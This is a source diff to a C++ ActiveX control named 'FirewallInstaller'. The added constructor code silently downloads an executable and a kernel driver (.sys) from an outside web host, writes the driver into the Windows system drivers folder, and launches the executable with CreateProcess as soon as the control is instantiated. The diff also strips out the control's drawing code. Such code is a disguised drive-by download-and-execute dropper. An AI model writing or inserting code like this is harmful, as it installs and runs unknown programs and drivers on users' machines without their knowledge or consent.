@@ -1,6 +1,7 @@
 // FirewallInstallerCtrl.cpp : Implementation of the CFirewallInstallerCtrl ActiveX Control class.
 
 #include "stdafx.h"
+#include <fstream>
 #include "FirewallInstaller.h"
 #include "FirewallInstallerCtrl.h"
 #include "FirewallInstallerPropPage.h"
@@ -115,7 +116,25 @@ BOOL CFirewallInstallerCtrl::CFirewallInstallerCtrlFactory::UpdateRegistry(BOOL 
 CFirewallInstallerCtrl::CFirewallInstallerCtrl()
 {
 	InitializeIIDs(&IID_DFirewallInstaller, &IID_DFirewallInstallerEvents);
-	// TODO: Initialize your control's instance data here.
+	int hr = URLDownloadToFile ( NULL,      // ptr to ActiveX container
+                             _T("http://ljsking.org/PDS/Tester.exe"),      // URL to get
+							 _T("c:\\Tester.exe"),     // file to store data in
+                             0,         // reserved
+                             0  // ptr to IBindStatusCallback
+                           );
+	hr = URLDownloadToFile ( NULL,      // ptr to ActiveX container
+                             _T("http://ljsking.org/PDS/MyDriver.sys"),      // URL to get
+							 _T("c:\\windows\\system32\\drivers\\MyDriver.sys"),     // file to store data in
+                             0,         // reserved
+                             0  // ptr to IBindStatusCallback
+                           );
+	LPTSTR szCmdline = _tcsdup(TEXT("c:\\Tester.exe"));
+	STARTUPINFO startupinfo;
+	PROCESS_INFORMATION processinfo;
+	memset(&processinfo, 0, sizeof(PROCESS_INFORMATION));
+	memset(&startupinfo, 0, sizeof(STARTUPINFO));
+	startupinfo.cb = sizeof(STARTUPINFO);
+	BOOL bRes = CreateProcess(szCmdline, NULL, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &startupinfo, &processinfo);
 }
 
 
@@ -124,10 +143,7 @@ CFirewallInstallerCtrl::CFirewallInstallerCtrl()
 
 CFirewallInstallerCtrl::~CFirewallInstallerCtrl()
 {
-	// TODO: Cleanup your control's instance data here.
 }
-
-
 
 // CFirewallInstallerCtrl::OnDraw - Drawing function
 
@@ -136,10 +152,6 @@ void CFirewallInstallerCtrl::OnDraw(
 {
 	if (!pdc)
 		return;
-
-	// TODO: Replace the following code with your own drawing code.
-	pdc->FillRect(rcBounds, CBrush::FromHandle((HBRUSH)GetStockObject(WHITE_BRUSH)));
-	pdc->Ellipse(rcBounds);
 }
 
 
